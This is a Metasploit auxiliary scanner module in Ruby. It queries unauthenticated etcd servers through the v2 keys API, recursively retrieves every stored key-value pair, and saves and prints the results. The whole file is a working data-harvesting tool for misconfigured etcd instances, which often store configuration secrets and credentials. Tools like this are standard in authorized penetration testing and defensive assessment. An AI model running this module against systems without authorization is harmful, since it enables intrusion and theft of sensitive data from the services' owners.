##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Etcd
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Etcd Keys API Information Gathering',
      'Description' => %q(
        This module queries the etcd API to recursively retrieve all of the stored
        key value pairs.  Etcd by default does not utilize authentication.
      ),
      'References' => [
        ['URL', 'https://gcollazo.com/the-security-footgun-in-etcd/']
      ],
      'Author' => [
        'Giovanni Collazo <hello@gcollazo.com>', # discovery
        'h00die' # msf module
      ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => '2018-03-16'
    )
  end

  def run_host(_target_host)
    path = normalize_uri(target_uri.to_s, 'v2/keys/?recursive=true')

    banner = fingerprint_service(target_uri.to_s)
    vprint_status("#{peer} - Collecting data through #{path}...")
    request = {
      'uri' => path,
      'method' => 'GET'
    }
    # The native v2 API rejects unauthenticated reads without issuing a
    # WWW-Authenticate challenge, so the HTTP client's automatic retry cannot
    # supply configured credentials. Keep explicitly selected auth modes intact.
    if datastore['HttpUsername'].present? && [Msf::Exploit::Remote::AuthOption::AUTO, Msf::Exploit::Remote::AuthOption::PLAINTEXT].include?(datastore['HTTP::Auth'])
      request['authorization'] = basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
    end
    res = send_request_raw(request)

    # parse the json if we got a good request back
    if res && res.code == 200
      response = res.get_json_document
      unless response.is_a?(Hash) && response['action'] == 'get' && response['node'].is_a?(Hash)
        vprint_error('Keys response does not contain an etcd v2 key document')
        return
      end
      store_loot('etcd.data', 'text/json', rhost, JSON.generate(response), 'etcd.keys', 'etcd keys')
      print_good("#{peer}\nVersion: #{banner}\nData: #{JSON.pretty_generate(response)}")
    elsif res
      vprint_error("Invalid response #{res.code} for etcd open keys response")
      return
    else
      vprint_error('No response for etcd open keys probe')
      return
    end
  end
end
